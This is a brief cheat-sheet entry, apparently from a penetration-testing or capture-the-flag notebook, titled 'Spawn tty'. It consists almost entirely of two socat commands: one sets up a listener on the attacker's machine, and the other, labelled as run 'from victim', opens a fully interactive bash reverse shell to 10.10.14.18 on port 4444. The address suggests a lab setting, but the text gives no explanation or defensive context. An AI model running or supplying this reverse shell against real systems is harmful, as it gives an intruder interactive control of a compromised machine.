Spawn tty

listener on your machine:
socat file:\`tty\`,raw,echo=0 tcp-listen:4444 

connect from victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.18:4444 

